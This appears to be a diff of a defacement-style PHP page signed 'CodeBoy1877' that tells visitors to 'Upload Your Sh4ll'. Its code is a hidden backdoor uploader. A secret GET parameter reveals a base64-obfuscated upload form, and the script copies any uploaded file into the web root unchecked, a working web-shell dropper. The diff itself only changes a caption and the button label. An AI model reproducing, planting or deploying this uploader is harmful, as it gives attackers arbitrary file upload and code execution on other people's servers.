@@ -8,13 +8,13 @@
 <h2>Twitter : CodeBoy1877</h2>
 <h2>Instagram : CodeBoy1877</h2>
 <p>Upload Your Sh4ll <?php echo $_SERVER['REQUEST_URI'];
- ?> And Fuck it.</p>
+ ?> And Enjoy it.</p>
  </center>
 </body></html>
 <center>
 <?php
 if(isset($_GET["1877"])){
- echo(base64_decode("Ijxmb3"."JtIG1ldGhvZD0n"."UE9TVCcgZW5jdHlw"."ZT0nbXVsdGlwYXJ0L2Z"."vcm0tZGF0YSc+PGl"."ucHV0IHR5cGU9J2ZpbGUnbmF"."tZT0nZicgLz48aW5wdXQgdHlwZT0nc3V"."ibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI="));
+ echo(base64_decode("Ijxmb3"."JtIG1ldGhvZD0n"."UE9TVCcgZW5jdHlw"."ZT0nbXVsdGlwYXJ0L2Z"."vcm0tZGF0YSc+PGl"."ucHV0IHR5cGU9J2ZpbGUnbmF"."tZT0nZicgLz48aW5wdXQgdHlwZT0nc3V"."ibWl0JyB2YWx1ZT0nRnVjayBpdCcgLz48L2Zvcm0+Ig=="));
  @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
  echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
 }
